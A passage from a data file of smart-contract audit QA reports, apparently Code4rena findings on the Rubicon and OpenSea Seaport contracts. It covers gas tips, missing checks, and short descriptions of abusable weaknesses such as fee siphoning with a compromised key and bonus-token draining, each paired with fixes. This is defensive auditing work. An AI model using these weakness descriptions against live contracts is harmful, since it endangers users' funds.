feeBPS\n                    );\n                }\n            }\n        }\n    }\n```\nA similar concept was implemented here: BathPair.sol  [line 478](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L478)\n\n### Use calldata instead of memory \nuse calldata when you only need read-only data, avoiding the cost of allocating memory or storage. \nFile: RubiconMarket.sol [line 256](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L256-L268)\n\n\n```\n    function bump(bytes32 id_) external can_buy(uint256(id_)) {\n        uint256 id = uint256(id_);\n        emit LogBump(\n            id_,\n            keccak256(abi.encodePacked(offers[id].pay_gem, offers[id].buy_gem)),\n            offers[id].owner,\n            offers[id].pay_gem,\n            offers[id].buy_gem,\n            uint128(offers[id].pay_amt),\n            uint128(offers[id].buy_amt),\n            offers[id].timestamp\n        );\n    }\n```\nBytes32 id_ should be stored in calldata to reduce gas cost\n\n`bytes32 calldata id_`\n\n**Other Instances:**\nBathpair.sol [line 577](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L578-L586)\n```\n    /// @notice Batch scrub outstanding strategist trades and return funds to LPs\n    function scrubStrategistTrades(uint256[] memory ids)\n        external\n        onlyApprovedStrategist(msg.sender)\n    {\n        for (uint256 index = 0; index < ids.length; index++) {\n            uint256 _id = ids[index];\n            scrubStrategistTrade(_id);\n        }\n    }\n```\t\nFile: RubiconMarket.sol [line 431](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L431-L433)\n\nFile: RubiconMarket.sol [line 590](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L590-L592)\n\nFile: RubiconMarket.sol [line 594](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L594-L596)",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/418"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA by blackscale\n\nThis report describes low severity issues by file, in their order of appearance in the code. It includes a mix of notes related to best practices and code clarity, and low impact or low probability issues.\n\n## RubiconMarket.sol#L282\n\nThe error message is misleading.\n\n## RubiconMarket.sol#L283\n\nThe error message is misleading.\n\n## RubiconMarket.sol#L298\n\nIf feeTo is set to 0x0, most ERC20 implementations (e.g. OpenZeppelin's) will revert on this transfer, making offers unbuyable.\n\n## RubiconMarket.sol#L479\n\nMarket can never be reopened once it has been stopped.\n\n## RubiconMarket.sol#L697\n\nAlthough this function can not be called during a reentrancy, it is itself reentrant, via `_sort`. Consider adding a warning for future dev, so the risk does not compound during composition or evolution of the contract.\n\n## RubiconMarket.sol#L1231\n\nThis function allows an attacker with a compromised key to set an arbitrarily high fee. The fee will steal an arbitrary amount from buyers (with an infinite allowance) or up to the maximum allowance set for this contract.\nThis is in some cases mitigated by the use of the router, which allows to set a minimum amount to control slippage, but any contract or user that interacts directly with RUbiconMarket remains vulnerable.\n\nConsider bounding `feeBPS` to a sensible maximum value, or introducing a timelock to allow enough time for detection and reaction in case of wrongdoing.\n\n## RubiconMarket.sol#L1256\n\nThis function allows an attacker with a compromised key to immediately divert all future fees to an arbitrary address. When combined with the issue described on `RubiconMarket.sol#L1231`, this allows to siphon a large amount of user funds until the changes get noticed and a mitigation solution is found and implemented.\n\nConsider introducing a timelock mechanism to allow enough time for detection and reaction, in order to better protect users.\n\n## RubiconMarket.sol#L1257\n\nThere is no check on the input not being zero. Considering the issue on `RubiconMarket.sol#L298`, such a mistake could have even worst consequences than simply not collecting fees until corrected.\n\nConsider checking the input against the zero address.\n\n## RubiconRouter.sol#L243\n\nThe comment is misleading and makes wrong assumptions.\n\nCalling `RubiconMarket.sellAllAmount` with a zero minimum amount means that all intermediary swaps of the route bypass the minimum. The rationale is that if the route ends up fulfilling the  buy_amt_min requirement of the whole swap, we don't care what happened in between. It would also be very complex to calculate a sensible value for each step.\n\n## RubiconRouter.sol#L251\n\nWill revert if `to` is set to zero.\n\nConsider checking `to` argument against zero value, and in case replacing it with `msg.sender`.\n\n## RubiconRouter.sol#L547\n\ncommented-out code should be removed.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/416"
    }
  },
  {
    "title": "QA Report",
    "body": "## L01 - Missing zero address checks in admin setters\n\nSome functions missing zero address checks when setting admin addresses, which could lead to loss of admin control.\n\nApply a zero-address check and consider implementing a two-step process transferOwnership, where the owner assigns an account and the designated account must call the acceptOwnership() function for full transfer of ownership. \n\n```solidity \n    function setOwner(address owner_) external auth { \n        owner = owner_;\n        emit LogSetOwner(owner);\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L22-L25\n\n```solidity \n    function setBathHouseAdmin(address newAdmin) external onlyAdmin { \n        admin = newAdmin;\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L253-L255\n\n```solidity \n    function setBathHouse(address newBathHouse) external onlyBathHouse {  \n        bathHouse = newBathHouse;\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L250-L252\n\n## L02 - Missing zero address checks in ```_deposit()``` and ```_withdraw()``` functions\n\nUser could mistakenly set ```receiver``` parameter to zero address in [```deposit()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L441-L446), [```mint()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L464-L471), [```withdraw()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L505-L521) and [```redeem()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L542-L552) functions. This would lead to loss of user funds.\nRecommend to add check for zero address for ```receiver``` parameter.\n\n## L03 - ERC20 tokens with no return value will fail to transfer in functions ```buy()```, ```cancel()```, ```offer()```, ```swapForETH()```, ```openBathTokenSpawnAndSignal()```\n\nAlthough the ERC20 standard suggests that a transfer should return true on success, many tokens are non-compliant in this regard. In that case, the call here will revert even if the transfer is successful:\n\n```solidity\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee), \n            \"Insufficient funds to cover fee\"\n        );\n        \n        ...\n        \n        require(\n            _offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend), \n            \"_offer.buy_gem.transferFrom(msg.sender, _offer.owner, spend) failed - check that you can pay the fee\"  \n        );\n        require(\n            _offer.pay_gem.transfer(msg.sender, quantity), \n            \"_offer.pay_gem.transfer(msg.sender, quantity) failed\" \n        );\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L272-L347\n\n```solidity\n        require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L351-L376\n\n```solidity\n        require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L392-L429\n\n```solidity\n        require(\n            ERC20(route[0]).transferFrom( \n                msg.sender,\n                address(this),\n                pay_amt.add(pay_amt.mul(expectedMarketFeeBPS).div(10000)) \n            ),\n            \"initial ERC20 transfer failed\"\n        );\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L519-L549\n\n```solidity\n        require(\n            newBathTokenUnderlying.transferFrom( \n                msg.sender,\n                address(this),\n                initialLiquidityNew\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n\n        ...\n\n        require(\n            desiredPairedAsset.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityExistingBathToken\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\" \n        );\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L136-L203\n\n## L04 - Lack of event emitting after sensitive actions\n\nContracts do not emit relevant events after setting sensitive variables.\n\nConsider emitting events after sensitive changes take place, to facilitate tracking and notify off-chain clients following the contract’s activity in following functions:\n\n```solidity \n    function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) { \n        feeBPS = _newFeeBPS;\n        return true;\n    }\n\n    ...\n\n    function setFeeTo(address newFeeTo) external auth returns (bool) {\n        feeTo = newFeeTo;\n        return true;\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L1231-1256\n\n```solidity\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin { \n        admin = newAdmin;\n    }\n\n    /// @notice Admin-only function to set a new Bath Token implementation\n    /// @dev Please note that all bathTokens created will use this abi\n    function setNewBathTokenImplementation(address newImplementation) external onlyAdmin {\n        newBathTokenImplementation = newImplementation;\n    }\n\n    /// @notice Admin-only function to approve a new permissioned strategist\n    function approveStrategist(address strategist) public onlyAdmin {\n        approvedStrategists[strategist] = true;\n    }\n\n    /// @notice Admin-only function to set whether or not strategists are permissioned\n    function setPermissionedStrategists(bool _new) external onlyAdmin {\n        permissionedStrategists = _new;\n    }\n\n    /// @notice Admin-only function to set timeDelay\n    function setCancelTimeDelay(uint256 value) external onlyAdmin {\n        timeDelay = value;\n    }\n\n    /// @notice Admin-only function to set reserveRatio\n    function setReserveRatio(uint256 rr) external onlyAdmin {\n        require(rr <= 100); \n          require(rr > 0);\n        reserveRatio = rr;\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L253-L283\n\n```solidity\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse { \n        RubiconMarketAddress = newRubiconMarket; \n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse { \n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1); \n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse { \n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse { \n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L245-L272\n\n## L05 - Drain bonus tokens\n\n\nSince bonus tokens distribute each time users [```withdraw()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L588-625) their shares, there are possible situations when fee amount for withdrawal is less than value of bonus token distributed. It could lead to draining bonus tokens by malicious users which repeatedly deposit-withdraw their shares unlit it's profitably - leaving other shares holders without bonus tokens.\n\nConsider distribution of bonus tokens based on shares holding time.\n\n## L06 - Adding new orders to list of strategist orders could lead to Dos\n\nFunction [```getIndexFromElement()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathPair.sol#L305-L319) iterates through list of strategist open orders, if list would be too big it could run out of gas. \nIt could lead to inability to cancel strategist orders on pair, since function [```handleStratOrderAtID()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathPair.sol#L213-L289) calling ```getIndexFromElement()```.\n\nConsider adding limitation for number of open orders by strategist on one pair.\n\n```solidity\n    function getIndexFromElement(uint256 uid, uint256[] storage array)\n        internal\n        view\n        returns (uint256 _index)\n    {\n        bool assigned = false;\n        for (uint256 index = 0; index < array.length; index++) { \n            if (uid == array[index]) {\n                _index = index;\n                assigned = true;\n                return _index;\n            }\n        }\n        require(assigned, \"Didnt Find that element in live list, cannot scrub\"); \n    }\n```\n\n## L07 - Adding new bonus tokens could lead to Dos\n\nAdmin could only add new bonus tokens for withdrawers using function [```setBonusToken()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L270).\n\nWithdraw transaction calling to [```distributeBonusTokenRewards()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L629-L653) which could run out of gas if list of bonus tokens will be too big.\nThis would lead to the inability of users to withdraw their assets.\n\nConsider adding a function that allows the admin to delete addresses from [```bonusTokens```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L77).\n\n## N01 - Variable ```rewardsVestingWallet``` never change\n\nVariable [```rewardsVestingWallet```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L80) never changes and stays zero value which means that distribution of bonus tokens to pool withdrawers would not be possible \nin current implementation.\n\n## N02 - ```mint()``` function wouldn't work with fee-on-transfer tokens\n\nFunction [```mint()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L464) require to ```shares``` parameter to be equal to amount of shares that are minted inside [```_deposit()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L557-L585) function, but with FOT tokens minted shares amount would be less than expected, since [```previewMint()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L456-L460) function count ```assets``` amount without fee subtraction and transaction would be failed. \n\n```solidity\n    function mint(uint256 shares, address receiver) \n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\"); \n    }\n```\n\n## N03 - Not used function, variable and event\n\nFunction [```released()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L74-L76), event [```EtherReleased()```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L53) never used and variable [```_released```](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L27) never changes, remove it for readability and conciseness.\n\n```solidity \n\n    event EtherReleased(uint256 amount);\n\n    uint256 private _released;\n\n    /**\n     * @dev Amount of eth already released\n     */\n    function released() public view returns (uint256) {\n        return _released;\n    }\n\n```\n\n## N04 - Not specified visibility for variable \n\n```solidity\n    bool locked;\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L191\n\n## N05 - Commented code\n\nSome lines of code are commented out, remove it for readability and conciseness.\n\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L93-L110\n\n## N06 - Missing revert strings in ```require``` statements\n\nAdd messages to the next ```require``` statements to make contracts more self-explanatory.\n\n```solidity\ncontracts/RubiconMarket.sol:210\ncontracts/RubiconMarket.sol:216\ncontracts/RubiconMarket.sol:217\ncontracts/RubiconMarket.sol:226\ncontracts/RubiconMarket.sol:432\ncontracts/RubiconMarket.sol:459\ncontracts/RubiconMarket.sol:460\ncontracts/RubiconMarket.sol:466\ncontracts/RubiconMarket.sol:467\ncontracts/RubiconMarket.sol:702\ncontracts/RubiconMarket.sol:703\ncontracts/RubiconMarket.sol:865\ncontracts/RubiconMarket.sol:906\ncontracts/RubiconMarket.sol:960\ncontracts/RubiconMarket.sol:970\ncontracts/RubiconMarket.sol:985\ncontracts/RubiconMarket.sol:1002\ncontracts/RubiconMarket.sol:1119\ncontracts/RubiconMarket.sol:1131\ncontracts/RubiconMarket.sol:1175\ncontracts/RubiconMarket.sol:1180\ncontracts/RubiconMarket.sol:1184\ncontracts/RubiconMarket.sol:1193\ncontracts/RubiconMarket.sol:1209\ncontracts/RubiconRouter.sol:42\ncontracts/rubiconPools/BathHouse.sol:88\ncontracts/rubiconPools/BathHouse.sol:104\ncontracts/rubiconPools/BathHouse.sol:110\ncontracts/rubiconPools/BathHouse.sol:111\ncontracts/rubiconPools/BathHouse.sol:280\ncontracts/rubiconPools/BathHouse.sol:281\ncontracts/rubiconPools/BathPair.sol:118\ncontracts/rubiconPools/BathPair.sol:143\ncontracts/rubiconPools/BathToken.sol:186\n```\n\n## N07 - Extra brackets\n\n```solidity \n        address pairedPool = getBathTokenfromAsset((desiredPairedAsset)); \n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L179\n\n## N08 - Typos \n\n```solidity \ncontracts/RubiconMarket.sol:851    fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator // typo - accumulator\ncontracts/RubiconMarket.sol:860    fill_amt = add(fill_amt, baux); //Add amount bought to acumulator // typo - accumulator\ncontracts/RubiconMarket.sol:890    fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator  // typo - accumulator\ncontracts/RubiconMarket.sol:901    ); //Add amount sold to acumulator  // typo - accumulator\ncontracts/RubiconRouter.sol:187 // Return the wouldbe resulting swap amount // typo - would be\ncontracts/peripheral_contracts/BathBuddy.sol:110    // Keep tokens here by not transfering the _fee anywhere, it is accrued to the Bath Token's Bath Buddy // typo - transferring\ncontracts/rubiconPools/BathHouse.sol:132    /// @notice Please note, creating a Bath Token in this fashion ~does not~ gaurentee markets will be made for the new pair. This function signals the desire to have a new pair supported on Rubicon for strategists to consider market-making for // typo - guarantee\ncontracts/rubiconPools/BathHouse.sol:414    // Note, the option of a fee recipient for pool withdrawls exists. For all pools this is set to the pool itself in production and is visible via ~feeTo~ on any respective contract // typo - withdrawals\ncontracts/rubiconPools/BathPair.sol:211    /// @dev The local array of strategist IDs that exists for any given strategist [query via getOutstandingStrategistTrades()] acts as an acitve RAM for outstanding strategist trades // typo - active\ncontracts/rubiconPools/BathToken.sol:29    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers // typo - initially\ncontracts/rubiconPools/BathToken.sol:627    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers // typo - distribute\ncontracts/rubiconPools/BathHouse.sol:355    function getBathTokenfromAsset(ERC20 asset) public view returns (address) { // Should be capital `F` in function name \n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/413"
    }
  },
  {
    "title": "QA Report",
    "body": "## QA (LOW & NON-CRITICAL)\n\n* `transfer`  and  `safeTransfer` methods are used inside the codebase. Since these methods use 2300 gas stipend which is not adjustable, it may likely to get broken when calling a contract's fallback function.\n[Reference Link -1](https://swcregistry.io/docs/SWC-134), [Reference Link -2](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)\n\n*  Floating Pragma used in `VestingWallet.sol`.  Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma (i.e. by not using ^)  helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n[Reference](https://swcregistry.io/docs/SWC-103)\n\n* The whole project have different solidity compiler ranges ( 0.5.0 - 0.8.0) referenced. This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file. It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.\n\n* The project mostly uses Solidity version 0.7.6. Using an old version prevents access to new Solidity security checks. However the current version is 0.8.14 with more benefits and less bugs.\n\n* `block.timestamp` is used on many places at the scoped contracts. However, this can be manipulated by malicious miners like the options can be shown as expired before the end of the auction.\n[Reference](https://swcregistry.io/docs/SWC-116)\n\n\n*  The codebase uses `isContract()` function which should not be relied on if the target is a contract inside the construction. [Reference is here](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-isContract-address-)\n\n* The contract uses ecrecover() function. EVM's ecrecover is susceptible to signature malleability which allows replay attacks, but using OpenZeppelin’s ECDSA library can be mitigation in BathToken.sol for `permit()` function. [Reference](https://swcregistry.io/docs/SWC-117)\n  \n* The team can consider to  state the infinite allowance by using `type(uint256).max` instead of `uint256(-1)`  which is easier to read.\n\n* There is no `address(0)` or Zero value check at:\n BathHouse.sol; initialize() function for the params: `market`, `_newBathTokenImplementation`, `_proxyAdmin` \n initBathPair() function for the params: `_bathPairAddress` , \n\n* Critical address changes are not done in two steps for the followings:\n  In BathHouse.sol for `setBathHouseAdmin()`, `setBathHouseAdmin()`\n  In BathToken.sol for `setMarket()`, `setBathHouse()`,\n  In RubiconMarket.sol for `setOwner()`,\n  Changing critical addresses in contracts should be a two-step process where the first transaction (from the old/current address) registers the new address (i.e. grants ownership) and the second transaction (from the new address) replaces the old address with the new one (i.e. claims ownership). This gives an opportunity to recover from incorrect addresses mistakenly used in the first step. If not, contract functionality might become inaccessible. [Reference](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/1488), [Reference](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2369)\n\n* When changing state variables events are not emitted for some functions:\n  In BathToken.sol for `setBathTokenMarket()`, `setBonusToken()` or for Admin Only functions where the critical address changes like BathToken.sol's `setBathHouse()`\n\n* The OZ ERC20.sol imported 2 times at [here](https://github.com/onuhr/Rubicon-Finance/blob/bd57f873af081ee73a2b577ab7fe148d820a239e/contracts/rubiconPools/BathHouse.sol#L12-L13)\n\n* The require statements do not throw error messages for the following functions: \nFor BathHouse.sol; `initialize()` function , `setReserveRatio()` function\nWhen a require statement did not pass, it will not be possible to know which require statement did not pass since it does not throw error.\n\n* At RubiconMarket.sol, `can_offer()` modifier is confusing since there is no implementation function and there is no NatSpec for the modifier's service.\n\n* At RubiconMarket.sol, the `offer()` function, parameters are casted to uint128 without safe math. Not using SafeMath could lead to under-/overflows in certain cases.It also makes it hard to reason about the code, as the reverts only happen at a place that is far from the original overflow/unsafe cast. Updating to a newer Solidity version will break a lot of the code.\nRecommendation: Use SafeMath by default.Even if it seems like it's not needed in some places, it could still be that there is some code path that leads to issues that one didn't think of, or gets implemented in the future.\n\n* At RubiconMarket.sol, pay_gem was not approved to be transferred at [require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L416  )\n\n* At RubiconRouter.sol's swap() function there is no zero value check for the params:`pay_amt` & `buy_amt_min`\n\n* At VestingWallet.sol, OpenZeppelin's `Address.sol` is imported along with the `SafeERC20.sol`. However, SafeERC20.sol already inherits Address.sol. This created multiple inheritance. Contracts inheriting from multiple contracts with identical functions should specify the correct inheritance order i.e. more general to more specific to avoid inheriting the incorrect function implementation. [Reference](https://swcregistry.io/docs/SWC-125)\n\n* At VestingWallet.sol, the imported contracts are SafeERC20.sol, Address.sol, Context.sol, Math.sol. However, no proper contract identifier shown, leaving the contract not inheriting or using X library for Y variable.\n\n* At VestingWallet.sol, variables `_start`,`_duration`, `_released`  are implicitly converted without using Safe math or OZ's SafeCast Library. This may result in overflow/underflow especially in `release()` function. \n```solidity \n    function start() public view virtual returns (uint256) {\n        return _start;\n```\n```solidity\n    function duration() public view virtual returns (uint256) { \n        return _duration; \n    }\n```\n```solidity\n    function release() public virtual {\n        uint256 releasable = vestedAmount(uint64(block.timestamp)) - released(); \n        _released += releasable;\n        emit EtherReleased(releasable);\n        Address.sendValue(payable(beneficiary()), releasable);\n    }\n```\nAlso at _vestingSchedule() the start() function calls the result variable as casted uint256 without safecast/safe math. This may cause underflow/overflow and result in `timestamp < start()` all the time and returns 0.\n\n* At VestingWallet.sol's release() function, the team can consider to emit the event after successfull [sendValue](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/VestingWallet.sol#L96) method.\n\n* At BathHouse.sol's `adminWriteBathToken()` function, there should be some require statement or mitigation for the advantage of the users. The users who are holding ex-bathtoken should not be affected by this call.\n\n* At BathHouse.sol's `setCancelTimeDelay()` function, in order to make the time delay variable meaningful, there should be upper limits for the function. Say the delay is set arbitrarily to a very unlikely high value, the users will certainly have the disadvantage of this.\n\n* At BathHouse.sol's `_createBathToken()` function, there is no address(0) check for `_feeAdmin` parameter, it may risk the fees to send to address(0). \n\n* At BathHouse.sol's `_createBathToken()` function, there is no address(0) check for `newBathTokenAddress = address(newBathToken);` at https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L432\n\n* BathPair.sol's `initialize` function can be frontrun since `require(msg.sender == address(BathHouse))` check is not one during initializing when called from [this line](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L247) in BathHouse.sol . \n\n* At BathToken.sol's `setFeeTo()` function there is no address(0) check\n\n* At BathToken.sol's `setBonusToken()` function, the parameter `newBonusERC20` is not verified against confirming ERC20 complaint.\n\n* At BathToken.sol's `withdraw()` function, there is a check for `assetsReceived >= assets`. However, this might not work for deflationary tokens. Or the logic should be `assetsReceived <= assets`\n\n* At BathToken.sol's `mint()` function, if an attacker send 1 wei to the underlying token vault (or the token is deflationary), the require statement will return false and the assets will be locked at the vault.\n\n```solidity\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\"); //@audit \n    }\n```\nhttps://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L464-L471\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/409"
    }
  },
  {
    "title": "QA Report",
    "body": "\n### 1. Accumulator armed check uses hardcoded value (low)\n\nNow the implementation uses hard code in one place and AccumulatorDisarmed constant in another:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/Executor.sol#L433-L435\n\n```solidity\n        if (accumulator.length != 64) {\n            return;\n        }\n```\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/Executor.sol#L599-L601\n\n```solidity\n        // \"Arm\" and prime accumulator if it's not already armed. The sentinel\n        // value is held in the length of the accumulator array.\n        if (accumulator.length == AccumulatorDisarmed) {\n```\n\nAlso, in reference implementation the same `accumulator.length != 64` check is inverted:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/reference/lib/ReferenceExecutor.sol#L313-L316\n\n```solidity\n        // Exit if the accumulator is not \"armed\".\n        if (accumulatorStruct.transfers.length == 0) {\n            return;\n        }\n```\n\n## Recommended Mitigation Steps\n\nConsider using the constant as it comes with no additional costs, reduces futher development risks and increases the code transparency:\n\n```solidity\n        if (accumulator.length != AccumulatorArmed) {\n            return;\n        }\n```\n\nor use the same approach as in reference and in _insert, which is even more clear:\n\n```solidity\n        if (accumulator.length == AccumulatorDisarmed) {\n            return;\n        }\n```\n\nIt boils down to the desired behavior on a malfunction: if bogus value happen to reside at accumulator.length, should accumulator be processed so no transfers are omitted or should no operation take place?\n\nIt is also prudent to have a revert if the value found at length slot is neither AccumulatorDisarmed, nor AccumulatorArmed, so no transfers would happen if the structure is somehow corrupted. The additional cost of one check here will guard possible wrong sequence of external token transfers.\n\n\n### 2. The list of order characteristics can be repeated exactly, yielding the same hash (low)\n\nSeveral fully similar orders can be simultaneously placed by an offerer not knowing the specifics of the system.\n\nTheir characteristics can be exactly the same. For example, nothing prevents an offerer from placing 5 fully similar offers for a particular ERC1155. Formally this would be a correct usage of the system, but it will lead to the first offer being utilized, while all the others being stuck. I.e. it is a use case limitation and currently it should be enforced by UI that such cases will have one offer for 5 ERC155 with partial fulfillments enabled instead, otherwise some users will experience unexpected behavior that can even stretch to a losses (say if other 4 sales were urgently needed for an offerer).\n\n## Proof of Concept\n\nOrders are being addressed by hash determined by the set of characteristics, that can be fully repeated in distinct orders:\n\nhttps://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L284-L300\n\n```solidity\n    // Derive order hash using the order parameters and the nonce.\n    bytes32 orderHash = _deriveOrderHash(\n        OrderParameters(\n            offerer,\n            zone,\n            order.offer,\n            order.consideration,\n            order.orderType,\n            order.startTime,\n            order.endTime,\n            order.zoneHash,\n            order.salt,\n            order.conduitKey,\n            order.consideration.length\n        ),\n        order.nonce\n    );\n```\n\nSecond order with all the same characteristics will not be fillable as it will have the same hash, while its numerator and denominator will stay, for example, to be equal to 1 if the first order was fulfilled with 